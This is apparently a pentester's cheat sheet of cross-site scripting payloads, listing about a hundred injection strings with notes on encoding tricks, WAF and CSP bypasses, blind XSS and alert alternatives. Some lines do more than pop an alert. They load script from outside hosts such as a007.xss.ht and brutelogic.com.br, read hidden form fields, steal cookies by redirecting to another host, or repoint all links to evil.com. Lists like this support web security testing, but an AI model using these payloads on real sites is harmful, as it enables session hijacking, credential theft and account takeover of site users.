%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E                       For ASP Encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E                                       double url enc
&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;    XML Reflectionxss
"onauxclick=alert(1);//
javascript://%250aalert(1)									  where :// is required after protocol
"\"&gt;&lt;s&gt;test"@gmail.com															   XSS in email id
javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));
&lt;script&gt;eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));&lt;/script&gt;
&lt;imG/sRc=l oNerrOr=(prompt)() x&gt;
"&gt;&lt;script src=https://a007.xss.ht&gt;&lt;/script&gt;											Blind 
&lt;body onpageshow=alert(1)&gt;
&lt;style onload=alert(1)&gt;
&lt;marquee behavior="alternate" onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;
&lt;d3"&lt;"/onclick="1&gt;[confirm``]"&lt;"&gt;z
&lt;script&gt;confirm(1)&lt;/script&gt;                                              HTML Encoding
“=””’&gt;&lt;/&gt;&lt;script&gt;&lt;/script&gt;&lt;svg onload=alert(1)&gt;
&lt;script&gt;var xss = '';f=document.forms;for(i=0;i&lt;f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';&lt;/script&gt;    GET Hidden Fields
&lt;table&gt;&lt;thead style=font-size:100px onmouseover=prompt(1)&gt;&lt;td&gt;XSS
&lt;svg/x="&gt;"/onload=confirm()//
&lt;sCript x&gt;(((confirm)))``&lt;/scRipt x&gt;
&lt;svg &lt;/onload ="1&gt; (_=prompt,_(1)) ""&gt;
&lt;!'/*"/*/'/*/"/*--&gt;&lt;/Script&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt;
&lt;w="/x="y&gt;"/ondblclick=`&lt;`[confir\u006d``]&gt;XXS
"&gt;&lt;script/x&gt;alert(1)&lt;/script/x&gt;
&lt;w="/x="y&gt;"/ondblclick=`&lt;`[confir\u006d``]&gt;click
"&gt;&lt;!--&lt;iMg sRc=--&gt;&lt;img src=x oNERror=(prompt)`1` x&gt;"
"&gt;&lt;deTails oNToggle=confi\u0072m(1)&gt;"
&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();&lt;/script&gt;   			   Get response back to server
&lt;A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x&gt;XSS
data:,alert(1)
\'-alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
"&gt;&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;                                          (CSP bypass if http://ajax.googleapis.com is whitelisted)
"&gt;&lt;embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always&gt;   (CSP bypass if http://ajax.googleapis.com is whitelisted)
&lt;script src=data:,alert(1)&gt;                                   when closing script tag is somewere 
&lt;x:script xmlns:x="http://www.w3.org/1999/xhtml"&gt;alert(1)&lt;/x:script&gt;               xss in xml page
&lt;x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/&gt;
{{constructor.constructor('alert(1)')()}} 
&lt;x ng-app&gt;{{constructor.constructor('alert(1)')()}}   			                        angular JS
&lt;SCRIPT SRC=//BRUTELOGIC.COM.BR/1&gt;&lt;/SCRIPT&gt;                                             upper case
&lt;SVG ONLOAD=&#97&#108&#101&#114&#116(1)&gt;                                                upper case
data:text/html,&lt;svg onload=alert(1)&gt;
&lt;a/href=//0&gt; shortest link injection
"\"&gt;&lt;sCriPt sRc=//14.rs&gt;"
&lt;k onsubmit=alert(1)&gt;                                                              before form tag
&lt;k oninput=alert(1)&gt;
foobar"/%0D&lt;body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//
&lt;script ~~~&gt;confirm(1)&lt;/script ~~~&gt;
  &lt;svg/onload=alert(cookie)&gt;
window+=valueOf=alert(1)
[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//
&lt;script&gt;([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)&lt;/script&gt;
&lt;script&gt;([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')``&lt;/script&gt;
"&gt;&lt;svG oNLoad=confirm&#x28;1&#x29&gt;   									when () and `` not working
&lt;script&gt;this[Object["keys"](this)[6]](1)&lt;/script&gt;
&lt;svgonload=alert(1)&gt;		
&lt;xss/ondblclick=[cookie].some(alert)&gt;XSS													   	  space bypass
accesskey="X" onclick="alert(1)"													  Hidden Field
&lt;svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
&lt;script&gt;onerror=alert;throw document.domain;&lt;/script&gt;  
javascript:void(a='//127.0.0.1');void(b=document.domain);void(c=a.concat(b));void(window.location.assign(c));                                               Cookie stealing with javascript protocol
&lt;base href=//evil.com&gt;     										change all hyper link to evil.com
&lt;x onpointerenter=alert()&gt;XSS		                                       onmouseover alternative
-alert(1)//\       (quoteless xss inside js context when param is refelcting 2 times in same line)
&lt;html ontouchstart=alert(1)&gt;XSS          										Mobile browser XSS
&lt;h1/ondrag=confirm(1)&gt;DragMe&lt;/h1&gt;
&lt;svg onload=setInterval`alert\x28document.domain\x29`&gt;
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')() 										   				          Alert alternatives
(alert)(1)
a=alert,a(1)	
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
&lt;svg/onload=innerHTML=location.hash&gt; #&lt;img/src/onerror=alert(1)&gt;
'"&lt;/Script&gt;&lt;Html /Onmouseover=(alert)(1) //
&lt;svg onload=alert&lpar;1&rpar;&gt;
&lt;svg onload=alert&#x28;1&#x29&gt;
&lt;svg onload=alert&#40;1&#41&gt;
&lt;svg onload=setInterval`alert\x28document.domain\x29`&gt;
"&gt;&lt;input type="submit" formaction="javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"&gt;
&lt;body onpageshow=alert(1)&gt;
&lt;body onfocus=alert(1)&gt;
" onfocus=alert(1) autofocus													auto trigger
&lt;marquee/onstart=alert()&gt;
&lt;object data=javascript:alert(1)&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
%253cscript%253ealert(document.cookie)%253c/script%253e
&lt;audio/onloadstart=alert(1) src&gt;
%u0025%u0075%u0066%u0066%u0031%u0063%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065%u0061%u006c%u0065%u0072%u0074%u0028%u0018%u0058%u0053%u0053%u0019%u0029%u003b%u0025%u0075%u0066%u0066%u0031%u0063%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u0025%u0075%u0066%u0066%u0031%u0065
%uff1cscript%uff1ealert(1);%uff1c/script%uff1e					
&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt;                            akamai ghost wafbypass
------------------------------------------------------------------------------------------------
Events :
onxxxx
onauxclick
ondblclick
oncontextmenu
onpageshow
onpointerenter
onloadstart
ontouchstart

Reference 
https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/

